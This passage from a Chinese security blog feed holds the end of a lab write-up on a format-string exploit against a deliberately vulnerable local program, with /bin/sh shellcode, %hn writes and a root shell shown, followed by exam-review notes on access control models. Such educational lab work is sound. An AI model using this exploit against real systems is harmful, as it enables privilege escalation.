class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p>编译:gcc -m32 -z execstack -o fmtvul fmtvul.c</p>\n<p>echo $(printf “\\xaa\\xaa\\xaa\\xaa”).%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x &gt; badfile</p>\n<p>和书上的不太一样,这里是第22个,不对,是第21个,第一个是”\\xaa\\xaa\\xaa\\xaa”这个,不算,所以%.8x是输出了20个后到了aaaaaaaa.</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@VM<span class=\"number\">-24</span><span class=\"number\">-10</span>-ubuntu:/home/ubuntu/cssec/strings/shell# ./fmtvul</span><br><span class=\"line\">the address of the input <span class=\"built_in\">array</span>: <span class=\"number\">0xffffd514</span></span><br><span class=\"line\">the value of the frame pointer: <span class=\"number\">0xffffd4e8</span></span><br><span class=\"line\">the value of the <span class=\"keyword\">return</span> address: <span class=\"number\">0x565556fd</span></span><br><span class=\"line\">����<span class=\"number\">.565556</span>fd<span class=\"number\">.00000000</span><span class=\"number\">.565555f</span>9<span class=\"number\">.5655583</span>c<span class=\"number\">.56555839</span>.ffffd4e8.ffffd4ec.f7fbd000<span class=\"number\">.56556f</span>cc.ffffd5e8<span class=\"number\">.565556f</span>d.ffffd514<span class=\"number\">.00000001</span><span class=\"number\">.000000</span>c8<span class=\"number\">.56558160</span>.f7ffdc30<span class=\"number\">.00000200</span><span class=\"number\">.00000400</span>.ffffd694<span class=\"number\">.56558160</span>.aaaaaaaa<span class=\"number\">.382e252</span>e<span class=\"number\">.2e252</span>e78<span class=\"number\">.252e7838</span><span class=\"number\">.2e78382</span>e<span class=\"number\">.78382e25</span><span class=\"number\">.382e252</span>e<span class=\"number\">.2e252</span>e78<span class=\"number\">.252e7838</span><span class=\"number\">.2e78382</span>e</span><br><span class=\"line\">�the value of the <span class=\"keyword\">return</span> address: <span class=\"number\">0x565556fd</span></span><br></pre></td></tr></table></figure>\n\n\n\n<p>返回地址 0xffffd4e8 + 0x4 &#x3D; 0xffffd4ec</p>\n<p>实验中跳转到str数组偏移量0x90的地方, 0xffffd514 +0x90 &#x3D; 0xffffd5a4</p>\n<p>exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"></span><br><span class=\"line\">shellcode = (</span><br><span class=\"line\">        <span class=\"string\">&quot;\\x31\\xc0\\x31\\xdb\\xb0\\xd5\\xcd\\x80&quot;</span></span><br><span class=\"line\">        <span class=\"string\">&quot;\\x31\\xc0\\x50\\x68//sh\\x68/bin\\x89\\xe3\\x50&quot;</span></span><br><span class=\"line\">        <span class=\"string\">&quot;\\x53\\x89\\xe1\\x99\\xb0\\x0b\\xcd\\x80\\x00&quot;</span></span><br><span class=\"line\">        ).encode(<span class=\"string\">&#x27;latin-1&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">N = <span class=\"number\">200</span></span><br><span class=\"line\"></span><br><span class=\"line\">content = <span class=\"built_in\">bytearray</span>(<span class=\"number\">0x90</span> <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(N))</span><br><span class=\"line\"></span><br><span class=\"line\">start = N - <span class=\"built_in\">len</span>(shellcode)</span><br><span class=\"line\">content[start:] = shellcode</span><br><span class=\"line\"></span><br><span class=\"line\">addr2 = <span class=\"number\">0xffffd3de</span></span><br><span class=\"line\">addr1 = <span class=\"number\">0xffffd3dc</span></span><br><span class=\"line\">content[<span class=\"number\">0</span>:<span class=\"number\">4</span>] = (addr1).to_bytes(<span class=\"number\">4</span>,byteorder=<span class=\"string\">&#x27;little&#x27;</span>)</span><br><span class=\"line\">content[<span class=\"number\">4</span>:<span class=\"number\">8</span>] = (<span class=\"string\">&quot;@@@@&quot;</span>).encode(<span class=\"string\">&#x27;latin-1&#x27;</span>)</span><br><span class=\"line\">content[<span class=\"number\">8</span>:<span class=\"number\">12</span>] = (addr2).to_bytes(<span class=\"number\">4</span>,byteorder=<span class=\"string\">&#x27;little&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">small = <span class=\"number\">0xd484</span> - <span class=\"number\">12</span> -<span class=\"number\">15</span>*<span class=\"number\">8</span></span><br><span class=\"line\">large = <span class=\"number\">0xffff</span> - <span class=\"number\">0xd484</span></span><br><span class=\"line\">s = <span class=\"string\">&quot;%.8x&quot;</span>*<span class=\"number\">15</span> + <span class=\"string\">&quot;%.&quot;</span> + <span class=\"built_in\">str</span>(small) + <span class=\"string\">&quot;x%hn%.&quot;</span> + <span class=\"built_in\">str</span>(large) +<span class=\"string\">&quot;x%hn&quot;</span></span><br><span class=\"line\">fmt = (s).encode(<span class=\"string\">&#x27;latin-1&#x27;</span>)</span><br><span class=\"line\">content[<span class=\"number\">12</span>:<span class=\"number\">12</span>+<span class=\"built_in\">len</span>(fmt)] = fmt</span><br><span class=\"line\"></span><br><span class=\"line\">file=<span class=\"built_in\">open</span>(<span class=\"string\">&quot;badfile&quot;</span>,<span class=\"string\">&quot;wb&quot;</span>)</span><br><span class=\"line\">file.write(content)</span><br><span class=\"line\">file.close()</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">                                               ̀the value of the <span class=\"keyword\">return</span> address: <span class=\"number\">0xffffd4ec</span></span><br><span class=\"line\">Segmentation fault (core dumped)</span><br></pre></td></tr></table></figure>\n\n<p>地址修改对了,但还是报错了,和libc版本有关系?还是需要去除保护?-fno-stack-protector</p>\n<p>the address of the input array: 0xffffd514<br>the value of the frame pointer: 0xffffd4f8</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@VM<span class=\"number\">-24</span><span class=\"number\">-10</span>-ubuntu:/home/ubuntu/cssec/strings/shell# ./fmtvul</span><br><span class=\"line\">the address of the input <span class=\"built_in\">array</span>: <span class=\"number\">0xffffd544</span></span><br><span class=\"line\">the value of the frame pointer: <span class=\"number\">0xffffd528</span></span><br><span class=\"line\">the value of the <span class=\"keyword\">return</span> address: <span class=\"number\">0x56555691</span></span><br><span class=\"line\">����<span class=\"number\">.56555691</span><span class=\"number\">.00000000</span><span class=\"number\">.565555</span>a9<span class=\"number\">.565557</span>ac<span class=\"number\">.565557</span>a9.ffffd52c.ffffd528.f7fbd000<span class=\"number\">.56556f</span>d0.ffffd618<span class=\"number\">.56555691</span>.ffffd544<span class=\"number\">.00000001</span><span class=\"number\">.000000</span>c8<span class=\"number\">.56558160</span><span class=\"number\">.00000000</span>.aaaaaaaa<span class=\"number\">.382e252</span>e<span class=\"number\">.2e252</span>e78<span class=\"number\">.252e7838</span><span class=\"number\">.2e78382</span>e<span class=\"number\">.78382e25</span><span class=\"number\">.382e252</span>e<span class=\"number\">.2e252</span>e78<span class=\"number\">.252e7838</span><span class=\"number\">.2e78382</span>e<span class=\"number\">.78382e25</span><span class=\"number\">.382e252</span>e<span class=\"number\">.2e252</span>e78<span class=\"number\">.252e7838</span></span><br><span class=\"line\">�the value of the <span class=\"keyword\">return</span> address: <span class=\"number\">0x56555691</span></span><br></pre></td></tr></table></figure>\n\n\n\n<p>问题出在了这里,在我们这里编译的时候,是第17个位置存储着str数组,和书上不一样,<font color=\"red\">这可能和编译器版本等有关,所以还是要具体问题具体分析,看懂了书里的,然后在实际操作中根据实际情况动态修改一些东西才可以</font></p>\n<p>从root用户切换到ubuntu也会改变一些东西,地址也变了</p>\n<p>the address of the input array: 0xffffd3f4                0xffffd3f4 + 0x90 &#x3D; 0xffffd484<br>the value of the frame pointer: 0xffffd3d8<br>the value of the return address: 0x5655569</p>\n<p>修改exp里面对应的地址和%x的个数,然后就可以了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">00000000000000000000000000000000000040404040</span>�������������������������������������������������������������������������<span class=\"number\">1</span>�<span class=\"number\">1</span>۰�̀<span class=\"number\">1</span>�Ph<span class=\"comment\">//shh/bin��PS�ᙰ</span></span><br><span class=\"line\">                                                               ̀the value of the <span class=\"keyword\">return</span> address: <span class=\"number\">0xffffd484</span></span><br><span class=\"line\"><span class=\"meta\"># id</span></span><br><span class=\"line\">uid=<span class=\"number\">0</span>(root) gid=<span class=\"number\">500</span>(ubuntu) groups=<span class=\"number\">500</span>(ubuntu),<span class=\"number\">4</span>(adm),<span class=\"number\">24</span>(cdrom),<span class=\"number\">27</span>(sudo),<span class=\"number\">30</span>(dip),<span class=\"number\">46</span>(plugdev),<span class=\"number\">113</span>(lpadmin),<span class=\"number\">114</span>(sambashare)</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<p>%n$x 表示格式字符串后的第n个数据</p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/",
            "url": "https://tangzichengcc.github.io/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/",
            "title": "ucas-网络与系统安全-复习",
            "date_published": "2022-12-30T11:18:28.000Z",
            "content_html": "<p>多选单选论述</p>\n<p>其中有大部分是其他同学完成的,自己做了一定的整合和修改.</p>\n<h1 id=\"第一次课：新形势安全面临挑战和安全保障能力提升\"><a href=\"#第一次课：新形势安全面临挑战和安全保障能力提升\" class=\"headerlink\" title=\"第一次课：新形势安全面临挑战和安全保障能力提升\"></a>第一次课：新形势安全面临挑战和安全保障能力提升</h1><h2 id=\"1-1-信息技术的发展趋势\"><a href=\"#1-1-信息技术的发展趋势\" class=\"headerlink\" title=\"1.1 信息技术的发展趋势\"></a>1.1 信息技术的发展趋势</h2><p>对象的特点: 融合、扩张、协作；</p>\n<h2 id=\"1-2-信息安全面临的挑战\"><a href=\"#1-2-信息安全面临的挑战\" class=\"headerlink\" title=\"1.2 信息安全面临的挑战\"></a>1.2 信息安全面临的挑战</h2><p>隐私、身份、电子依赖、信任绑架、信息财富、边界模糊</p>\n<h2 id=\"1-3-信息安全的技术发展趋势\"><a href=\"#1-3-信息安全的技术发展趋势\" class=\"headerlink\" title=\"1.3 信息安全的技术发展趋势\"></a>1.3 信息安全的技术发展趋势</h2><p>保护、检测、可生存、可信赖；</p>\n<p>检测又叫全周期…</p>\n<h1 id=\"第二次课：网络与系统安全的需求与目标\"><a href=\"#第二次课：网络与系统安全的需求与目标\" class=\"headerlink\" title=\"第二次课：网络与系统安全的需求与目标\"></a>第二次课：网络与系统安全的需求与目标</h1><p>​\t\t即我们要做到什么程度,上一节课是要做什么</p>\n<h2 id=\"2-1-信息安全的基本需求：CIAA\"><a href=\"#2-1-信息安全的基本需求：CIAA\" class=\"headerlink\" title=\"2.1 信息安全的基本需求：CIAA\"></a>2.1 信息安全的基本需求：CIAA</h2><p>机密性Confidentiality；完整性Integrity；可用性Availability；真实性Authenticity；</p>\n<h2 id=\"2-2-信息安全的目标\"><a href=\"#2-2-信息安全的目标\" class=\"headerlink\" title=\"2.2 信息安全的目标\"></a>2.2 信息安全的目标</h2><p>这句是重点:<strong>防止威胁利用弱点破坏信息安全特性</strong>, 以及 控制风险</p>\n<p>控制风险，确定威胁利用弱点实施 破坏发生的概率（识别风险），决定采取何种措施，将风险降低到可以接受的水平。从绝对安全到适度安全；防止威胁利用弱点破坏信息安全特性</p>\n<img src=\"/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106143853743.png\" alt=\"image-20230106143853743\" style=\"zoom:25%;\">\n\n<h2 id=\"信息安全风险的概念？从绝对安全到适度安全；\"><a href=\"#信息安全风险的概念？从绝对安全到适度安全；\" class=\"headerlink\" title=\"信息安全风险的概念？从绝对安全到适度安全；\"></a>信息安全风险的概念？从绝对安全到适度安全；</h2><img src=\"/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106144007466.png\" alt=\"image-20230106144007466\" style=\"zoom: 33%;\">\n\n<p>完成一个组织如何评估、应对、监视信息系统安全风险的策略性规定，包括</p>\n<ul>\n<li>详细的安全假定确定；</li>\n<li>安全风险控制实施所受的各种可能的限制；</li>\n<li>机构对风险的容忍程度；</li>\n<li>风险处理过程中的面临的各种这种决策的优先次序；</li>\n</ul>\n<p>威胁利用弱点给信息资产造成负面影响的潜在可能</p>\n<h2 id=\"2-3-保护阶段的目标：TCSEC橘皮书和CC标准；\"><a href=\"#2-3-保护阶段的目标：TCSEC橘皮书和CC标准；\" class=\"headerlink\" title=\"2.3 保护阶段的目标：TCSEC橘皮书和CC标准；\"></a>2.3 保护阶段的目标：TCSEC橘皮书和CC标准；</h2><h2 id=\"2-4-生命周期阶段的保护目标：\"><a href=\"#2-4-生命周期阶段的保护目标：\" class=\"headerlink\" title=\"2.4 生命周期阶段的保护目标：\"></a>2.4 生命周期阶段的保护目标：</h2><img src=\"/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106144344921.png\" alt=\"image-20230106144344921\" style=\"zoom:33%;\">\n\n<h3 id=\"入侵检测技术\"><a href=\"#入侵检测技术\" class=\"headerlink\" title=\"入侵检测技术\"></a>入侵检测技术</h3><p>IDS是PDR模型的中的重要支撑技术，IDS主要的功能为：监视、评估信息网络系统中的恶意或者违反安全策略的行为，并产生相应的报警。</p>\n<img src=\"/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106144415448.png\" alt=\"image-20230106144415448\" style=\"zoom:33%;\">\n\n<h3 id=\"PDCA-的概念：\"><a href=\"#PDCA-的概念：\" class=\"headerlink\" title=\"PDCA 的概念：\"></a>PDCA 的概念：</h3><img src=\"/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106144220608.png\" alt=\"image-20230106144220608\" style=\"zoom:25%;\">\n\n<ul>\n<li>Plan： 对ISMS范围所及进行风险评估和控制方案设计；</li>\n<li>Do：对于不可接受风险，实施风险处理计划，比如增加防火墙等安全措施；</li>\n<li>Check：分析运行效果，寻求改进机会；</li>\n<li>Act： 经过了评审之后，要执行的进一步动作；</li>\n</ul>\n<h2 id=\"2-5-可生存技术：拜占庭容错和门限密码技术\"><a href=\"#2-5-可生存技术：拜占庭容错和门限密码技术\" class=\"headerlink\" title=\"2.5 可生存技术：拜占庭容错和门限密码技术\"></a>2.5 可生存技术：拜占庭容错和门限密码技术</h2><p>技术思路: 消除单点失效</p>\n<h4 id=\"可生存技术的基本原理：\"><a href=\"#可生存技术的基本原理：\" class=\"headerlink\" title=\"可生存技术的基本原理：\"></a>可生存技术的基本原理：</h4><p>信息系统通过特定的设计，变得不是那么脆弱，一碰就倒，一触即溃。信息系统生存技术关注：计算过程的可靠性和错误容忍。</p>\n<img src=\"/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106144707638.png\" alt=\"image-20230106144707638\" style=\"zoom:25%;\">\n\n<img src=\"/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106144650598.png\" alt=\"image-20230106144650598\" style=\"zoom:25%;\">\n\n<h2 id=\"2-6-自重构可信赖保护技术：\"><a href=\"#2-6-自重构可信赖保护技术：\" class=\"headerlink\" title=\"2.6 自重构可信赖保护技术：\"></a>2.6 自重构可信赖保护技术：</h2><p>动态构建、适度安全、随着任务启动生成保护，随任务结束推出（保护的生与死）</p>\n<h1 id=\"第三次课：自主与强制访问控制\"><a href=\"#第三次课：自主与强制访问控制\" class=\"headerlink\" title=\"第三次课：自主与强制访问控制\"></a>第三次课：自主与强制访问控制</h1><p>自己的理解: 设定权限范围,划清界限</p>\n<p>保护的核心技术</p>\n<h2 id=\"3-1-访问控制的基本概念\"><a href=\"#3-1-访问控制的基本概念\" class=\"headerlink\" title=\"3.1 访问控制的基本概念\"></a>3.1 访问控制的基本概念</h2><p>框架模型,不是策略模型</p>\n<p>应用程序访问计算机资源，根据授权策略（ 规则集）决定访问请求是否被允许。</p>\n<h2 id=\"3-2-访问控制的要素？\"><a href=\"#3-2-访问控制的要素？\" class=\"headerlink\" title=\"3.2 访问控制的要素？\"></a>3.2 访问控制的要素？</h2><ul>\n<li>主体S（Subject）：资源访问的具体请求者，又称发起者（Initiator），可能是某一用户，信息系统中更多是用户启动的进程、服务和设备等。</li>\n<li>客体O（Object）：是指被访问资源的实体，又称目标（Target），所有可以被操作的信息、资源、对象都可以是客体。</li>\n<li>控制策略A（Attribution）：访问策略体现了主体对客体的授权行为，也是客体对主体某些操作行为的认可。</li>\n</ul>\n<h2 id=\"3-3-访问控制3种基本类型？\"><a href=\"#3-3-访问控制3种基本类型？\" class=\"headerlink\" title=\"3.3 访问控制3种基本类型？\"></a>3.3 访问控制3种基本类型？</h2><p>模型含义是重点,</p>\n<p>什么mac dac搞清楚</p>\n<p>模型不是来限制你的,而是有它适用范围,给你一个依据来具体设置访问控制模型</p>\n<h3 id=\"自主访问控制DAC-典型案例-UGO-Discretionary-Access-Control\"><a href=\"#自主访问控制DAC-典型案例-UGO-Discretionary-Access-Control\" class=\"headerlink\" title=\"自主访问控制DAC(典型案例:UGO) (Discretionary Access Control)\"></a>自主访问控制DAC(典型案例:UGO) (Discretionary Access Control)</h3><h3 id=\"强制访问控制MAC（Mandatory-Access-Control\"><a href=\"#强制访问控制MAC（Mandatory-Access-Control\" class=\"headerlink\" title=\"强制访问控制MAC（Mandatory Access Control)\"></a>强制访问控制MAC（Mandatory Access Control)</h3><h3 id=\"基于角色的访问控制RBAC\"><a href=\"#基于角色的访问控制RBAC\" class=\"headerlink\" title=\"基于角色的访问控制RBAC\"></a>基于角色的访问控制RBAC</h3><p>它和基于组的访问控制不一样</p>\n<img src=\"/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106145828352.png\" alt=\"image-20230106145828352\" style=\"zoom:25%;\">\n\n<h2 id=\"3-4-访问控制矩阵、访问控制列表、访问控制能力和安全标签的概念？\"><a href=\"#3-4-访问控制矩阵、访问控制列表、访问控制能力和安全标签的概念？\" class=\"headerlink\" title=\"3.4 访问控制矩阵、访问控制列表、访问控制能力和安全标签的概念？\"></a>3.4 访问控制矩阵、访问控制列表、访问控制能力和安全标签的概念？</h2><p>矩阵,列表 都属于dac,都是自主访问控制,和用户密切相关</p>\n<p>ibac列表和能力cbac很重要</p>\n<ul>\n<li><p>访问控制矩阵中一行代表一个主体，一列代表一个客体，一个元素表示一个主体被授权的对客体的操作；访问控制矩阵可以直观地表示主体与客体的关系，对于推导和描述访问控制策略具有意义。</p>\n</li>\n<li><p>访问控制列表(ibac,identify based access control基于身份的)是目标对象的属性表，它给定每个用户对给定目标的访问权限，本质上是访问控制矩阵的一个列。</p>\n<img src=\"/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106145325384.png\" alt=\"image-20230106145325384\" style=\"zoom: 33%;\">\n</li>\n<li><p>访问控制能力(cbac 基于能力的)是发起者拥有的一个有效标签（Ticket），它授权持有者以特定的方式访问特定的目标。</p>\n<img src=\"/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106145352028.png\" alt=\"image-20230106145352028\" style=\"zoom:33%;\">\n</li>\n<li><p>安全标签通常的用途是支持多级访问控制策略在访问控制中， 一个安全标签隶属于一个用户、一个目标、一个访问请求或传输中的一个访问控制信息。标签的产生和附着个过程必须可信，在处理一个访问请求时，目标环境比较请求上的标签和目标上的标签决定是允许还是拒绝访问。</p>\n</li>\n</ul>\n<h2 id=\"3-5-自主访问控制和强制访问控制；\"><a href=\"#3-5-自主访问控制和强制访问控制；\" class=\"headerlink\" title=\"3.5 自主访问控制和强制访问控制；\"></a>3.5 自主访问控制和强制访问控制；</h2><p>理解核心.角色是什么什么的</p>\n<h4 id=\"自主访问控制：\"><a href=\"#自主访问控制：\" class=\"headerlink\" title=\"自主访问控制：\"></a>自主访问控制：</h4><p>DAC允许合法用户以用户或用户组的身份访问策略规定的客体，同时阻止非授权用户访问客体。</p>\n<h4 id=\"强制访问控制：\"><a href=\"#强制访问控制：\" class=\"headerlink\" title=\"强制访问控制：\"></a>强制访问控制：</h4><p>MAC实现比DAC更为严格的访问控制策略， MAC是一种多级访问控制策略，用户和客体具有不同的安全级别，用户不能改变自身和客体的安全级别，只有管理员才能够确定用户和组的访问权限，系统对访问主体和受控对象， 按照安全级对应规则实行强制访问控制。</p>\n<h2 id=\"3-6-BLP、BIBA模型-多级安全强制访问控制策略\"><a href=\"#3-6-BLP、BIBA模型-多级安全强制访问控制策略\" class=\"headerlink\" title=\"3.6 BLP、BIBA模型(多级安全强制访问控制策略)\"></a>3.6 BLP、BIBA模型(多级安全强制访问控制策略)</h2><h3 id=\"Bell－Lapadula（BLP）模型-关注机密性\"><a href=\"#Bell－Lapadula（BLP）模型-关注机密性\" class=\"headerlink\" title=\"Bell－Lapadula（BLP）模型  关注机密性\"></a>Bell－Lapadula（BLP）模型  关注机密性</h3><p>客体被分成安全级别依次降低的:绝密、机密、秘密和公开等级别</p>\n<p>主体也被制定不同的安全级别</p>\n<p>BLP模型确保: <font color=\"red\">机密信息不会从高安全级别流向低安全级别</font></p>\n<p>BLP模型由政府资助的Mitre 公司正式提出，BLP模型关注多级安全中的机密性保护，客体被分成安全级别依次降低的：绝密、机密、秘密和公开等级别，主体也被制定不同的安全级别，BLP模型确保机密信息不会从高安全级别流向低安全级别。BLP模型中一个系统的状态可以用三元组{b,M,f}标示； 如果主体访问客体的操作与系统确定的安全规则一致，则系统的状态是安全的。 BLP模型定义了系统的安全规则。</p>\n<h3 id=\"BIBA模型-关注完整性\"><a href=\"#BIBA模型-关注完整性\" class=\"headerlink\" title=\"BIBA模型 关注完整性\"></a>BIBA模型 关注完整性</h3><p>BLP安全模型仅关注信息的机密性，Biba安全模型关注多级安全系统中的信息完整性保护。Biba模型由一组强制访问控制策略和一组自主访问控制策略组成。在操作系统里，为确保内核完整性，从Biba模型的角度，内核可以调用应用程序，反之将是违反Biba模型安全规则的操作。</p>\n<h2 id=\"3-7-Linux的UGO访问控制原理\"><a href=\"#3-7-Linux的UGO访问控制原理\" class=\"headerlink\" title=\"3.7 Linux的UGO访问控制原理\"></a>3.7 Linux的UGO访问控制原理</h2><p> 本质上属于 基于访问控制列表的机制</p>\n<p>在每个文件上附加一段有关访问控制信息的二进制位，这些二进制位反映了不同类别用户对该文件的存取方式，即文件的拥有者（User， Owner）、文件拥有者同组的用户（Group）和其他用户（Other），所以我们称这个方式为UGO自主访问控制。UGO属于基于访问控制列表的机制，基于访问控制列表的机制需要依赖于对用户的鉴别。</p>\n<h3 id=\"sudo\"><a href=\"#sudo\" class=\"headerlink\" title=\"sudo\"></a>sudo</h3><p>sudo岂不是万能的?和root一样吗?</p>\n<p>不是的,可以限制使用的</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#includedir /etc/sudoers.d</span></span><br><span class=\"line\">lighthouse ALL=(ALL) NOPASSWD: ALL</span><br><span class=\"line\">ubuntu  ALL=(ALL:ALL) NOPASSWD: ALL</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h1 id=\"第四次课：基于属性的访问控制ABAC\"><a href=\"#第四次课：基于属性的访问控制ABAC\" class=\"headerlink\" title=\"第四次课：基于属性的访问控制ABAC\"></a>第四次课：基于属性的访问控制ABAC</h1><h2 id=\"4-1-SELinux：基于类型的访问控制，安全上下文；\"><a href=\"#4-1-SELinux：基于类型的访问控制，安全上下文；\" class=\"headerlink\" title=\"4.1 SELinux：基于类型的访问控制，安全上下文；\"></a>4.1 SELinux：基于类型的访问控制，安全上下文；</h2><h3 id=\"SELinux基本概念\"><a href=\"#SELinux基本概念\" class=\"headerlink\" title=\"SELinux基本概念\"></a>SELinux基本概念</h3><p>通过类型强制（TE）访问控制提供了更为灵活、实用MAC机制。在SELInux中，所有访问必须明确授权，通过使用allow规则授予访问权限。Allow规则有四部分组成：</p>\n<ul>\n<li><ul>\n<li>源类型：尝试进行访问控制的域类型。</li>\n<li>目标类型：被进程访问的客体类型。</li>\n<li>客体类别：允许访问的客体的种类名称。</li>\n<li>许可：目标类型允许源类型访问的种类。</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"安全上下文\"><a href=\"#安全上下文\" class=\"headerlink\" title=\"安全上下文\"></a>安全上下文</h3><p>所有操作系统访问控制都是以关联的客体和主体的访问控制属性为基础；访问控制属性叫做安全上下文。一个安全上下文的组成格式如下：{用户；角色；类型}。</p>\n<img src=\"/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106154247145.png\" alt=\"image-20230106154247145\" style=\"zoom:25%;\">\n\n<h2 id=\"4-2-基于属性的访问控制（ABAC）：基本概念，主要元素，基本架构，传统访问控制模型与ABAC的联系；基于属性的策略。\"><a href=\"#4-2-基于属性的访问控制（ABAC）：基本概念，主要元素，基本架构，传统访问控制模型与ABAC的联系；基于属性的策略。\" class=\"headerlink\" title=\"4.2 基于属性的访问控制（ABAC）：基本概念，主要元素，基本架构，传统访问控制模型与ABAC的联系；基于属性的策略。\"></a>4.2 基于属性的访问控制（ABAC）：基本概念，主要元素，基本架构，传统访问控制模型与ABAC的联系；基于属性的策略。</h2><h5 id=\"ABAC基本概念\"><a href=\"#ABAC基本概念\" class=\"headerlink\" title=\"ABAC基本概念\"></a><strong>ABAC基本概念</strong></h5><p>ABAC定义了主题的属性和客体的属性以及访问发生时候的条件，ABAC将这些属性信息和条件信息与规则的信息对比进行访问控制决策。ABAC的控制规则由属性和条件信息组成。ABAC中每一个客体都必须至少有一个策略规则决定什么样的主体能够对其进行什么样的操作。</p>\n<h5 id=\"元素\"><a href=\"#元素\" class=\"headerlink\" title=\"元素\"></a>元素</h5><ul>\n<li><ul>\n<li>属性：刻画主体、客体和条件特性的“键值对”。</li>\n<li>主体：意图执行访问操作的自然人或非人设备。</li>\n<li>客体：ABAC保护下的系统资源例如： 设备、文件、进程、网络服务等。</li>\n<li>操作：主体对客体的操作，包括： 读、写、编辑、删除、拷贝、执行等。</li>\n<li>政策：一组规则或者关系，用于确定一个访问请求是否被允许或者拒绝。</li>\n<li>环境上下文：可以检测到的环境上下文特征，如：访问发生时的时间、地点和威胁水平等。</li>\n</ul>\n</li>\n</ul>\n<h5 id=\"架构-x2F-过程\"><a href=\"#架构-x2F-过程\" class=\"headerlink\" title=\"架构&#x2F;过程\"></a>架构&#x2F;过程</h5><ul>\n<li><ul>\n<li>Access Control 